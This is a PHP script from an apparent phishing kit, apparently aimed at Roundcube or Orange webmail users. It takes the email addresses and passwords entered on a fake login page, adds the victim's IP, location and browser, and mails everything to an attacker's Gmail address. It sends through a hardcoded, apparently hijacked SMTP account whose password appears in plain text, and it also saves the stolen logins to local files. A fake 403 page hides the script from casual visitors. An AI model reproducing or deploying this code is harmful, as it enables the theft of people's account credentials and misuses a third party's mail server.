<?php
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Set headers for CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Start session
session_start();

// Handle GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo '
    <html><head>
    <title>403 - Forbidden</title>
    </head><body>
    <h1>403 Forbidden</h1>
    <hr>
    </body></html>';
    exit;
}

// Configuration
$receiver     = "skkho87.sm@gmail.com"; // Where to receive the logs
$senderuser   = "okioko@museums.or.ke"; // SMTP user
$senderpass   = "onesmus@2022";         // SMTP password
$senderport   = 587;                    // SMTP port
$senderserver = "mail.museums.or.ke";   // SMTP server

// Get client information
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$browser = $_SERVER['HTTP_USER_AGENT'];

// Get form data
$login   = $_POST['email'] ?? '';
$passwd  = $_POST['password'] ?? '';
$email   = $login;
$auth_step = $_POST['auth_step'] ?? '';

// Extract domain from email
$parts  = explode("@", $email);
$domain = isset($parts[1]) ? $parts[1] : 'unknown.tld';

// Prepare message content
$message = nl2br("Email: $login\nPassword: $passwd\nIP of sender: " . 
    ($ipdat->geoplugin_countryName ?? 'Unknown') . " | " . 
    ($ipdat->geoplugin_city ?? 'Unknown') . " | " . 
    $ip . " | " . $browser);

// Function to send email
function sendEmail($subject, $message, $smtpConfig) {
    $mail = new PHPMailer(true);
    
    try {
        $mail->isSMTP();
        $mail->Host = $smtpConfig['host'];
        $mail->SMTPAuth = true;
        $mail->Username = $smtpConfig['username'];
        $mail->Password = $smtpConfig['password'];
        $mail->Port = $smtpConfig['port'];
        $mail->SMTPSecure = 'tls';
        $mail->From = $smtpConfig['username'];
        $mail->addAddress($smtpConfig['receiver']);
        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $message;
        $mail->AltBody = 'Enjoy new server';
        
        $result = $mail->send();
        
        // Log email attempt
        $logMessage = "Email attempt - Subject: $subject | Result: " . ($result ? 'Success' : 'Failed') . "\n";
        file_put_contents("email_debug.txt", $logMessage, FILE_APPEND);
        
        return $result;
    } catch (Exception $e) {
        // Log error
        $errorLog = "Email error - Subject: $subject | Error: " . $e->getMessage() . "\n";
        file_put_contents("email_debug.txt", $errorLog, FILE_APPEND);
        return false;
    }
}

// Function to validate credentials
function validateCredentials($email, $password, $domain) {
    // For this implementation, we'll simulate validation
    // In a real scenario, you might want to validate against a database
    // or use a different validation method
    
    // Debug: Log the validation attempt
    $validationLog = "Validating credentials - Email: $email, Password: " . (empty($password) ? 'EMPTY' : 'NOT_EMPTY') . ", Domain: $domain\n";
    file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
    
    // Basic validation - check if email format is valid
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $validationLog = "Email validation failed for: $email\n";
        file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
        return false;
    }
    
    // Check if password is not empty
    if (empty($password)) {
        $validationLog = "Password validation failed - password is empty\n";
        file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
        return false;
    }
    
    // For demonstration purposes, let's consider credentials as valid
    // if they have proper format (you can modify this logic as needed)
    $validationLog = "Validation successful - returning true\n";
    file_put_contents("validation_debug.txt", $validationLog, FILE_APPEND);
    return true;
}

// Main logic
if (!empty($login) && !empty($passwd)) {
    
    // Handle authentication step
    if ($auth_step === 'authenticating') {
        // Simulate authentication process with delay
        usleep(2000000); // 2 second delay to simulate authentication
        
        // Store authentication status in session
        $_SESSION['auth_status'] = 'authenticating';
        $_SESSION['auth_email'] = $login;
        $_SESSION['auth_password'] = $passwd;
        $_SESSION['auth_domain'] = $domain;
        
        $data = array('signal' => 'authenticating', 'msg' => 'Authenticating...');
        echo json_encode($data);
        exit;
    }
    
    // Handle final validation step
    if ($auth_step === 'validate' || empty($auth_step)) {
        // Debug: Log the received data
        $debugLog = "Received data - Login: $login, Auth step: $auth_step\n";
        file_put_contents("debug.txt", $debugLog, FILE_APPEND);
        
        // Try to validate the captured credentials
        $validCredentials = validateCredentials($login, $passwd, $domain);
        
        // Log the validation attempt
        $logMessage = "Login attempt: $login | Valid: " . ($validCredentials ? 'Yes' : 'No') . " | IP: $ip\n";
        file_put_contents("login_attempts.txt", $logMessage, FILE_APPEND);
        
        // Debug: Log the validation result
        $debugLog = "Validation result: " . ($validCredentials ? 'TRUE' : 'FALSE') . " for login: $login\n";
        file_put_contents("debug.txt", $debugLog, FILE_APPEND);
        
        if ($validCredentials) {
            // Valid credentials - send success notification
            $subg = "TrueRcubeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
            
            $smtpConfig = [
                'host' => "mail.museums.or.ke",
                'username' => $senderuser,
                'password' => $senderpass,
                'port' => $senderport,
                'receiver' => $receiver
            ];
            
            // Always send email notification for valid credentials
            $emailSent = sendEmail($subg, $message, $smtpConfig);
            
            // Log email sending attempt
            $emailLog = "Email sent for valid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
            file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
            
            if ($emailSent) {
                $data = array('signal' => 'ok', 'msg' => 'Login Successful');
                $debugLog = "Valid credentials - Email sent successfully - Setting signal to 'ok'\n";
                file_put_contents("debug.txt", $debugLog, FILE_APPEND);
            } else {
                $data = array('signal' => 'ok', 'msg' => 'Login Successful'); // Still show success even if email fails
                $debugLog = "Valid credentials - Email failed but still setting signal to 'ok'\n";
                file_put_contents("debug.txt", $debugLog, FILE_APPEND);
            }
        } else {
            // Invalid credentials - send failure notification
            $subg2 = "notVerifiedRcudeOrange || " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " || " . $login;
            
            $smtpConfig = [
                'host' => $senderserver,
                'username' => $senderuser,
                'password' => $senderpass,
                'port' => $senderport,
                'receiver' => $receiver
            ];
            
            // Always send the email notification for invalid credentials
            $emailSent = sendEmail($subg2, $message, $smtpConfig);
            
            // Log email sending attempt for invalid credentials
            $emailLog = "Email sent for invalid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
            file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
            
            // Return the correct error message
            $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
            $debugLog = "Invalid credentials - Setting signal to 'not ok' with 'Wrong Password' message\n";
            file_put_contents("debug.txt", $debugLog, FILE_APPEND);
        }
        
        // Debug: Log the response being sent
        $responseLog = "Sending response: " . json_encode($data) . "\n";
        file_put_contents("debug.txt", $responseLog, FILE_APPEND);
        
        echo json_encode($data);
        
        // Log to file
        $fp = fopen("SS-Or.txt", "a");
        fputs($fp, $message . "\n----------------------\n");
        fclose($fp);
        
        // Generate random identifier
        $praga = md5(rand());
    }
} else {
    // No credentials provided
    $data = array('signal' => 'error', 'msg' => 'No credentials provided');
    echo json_encode($data);
}
?>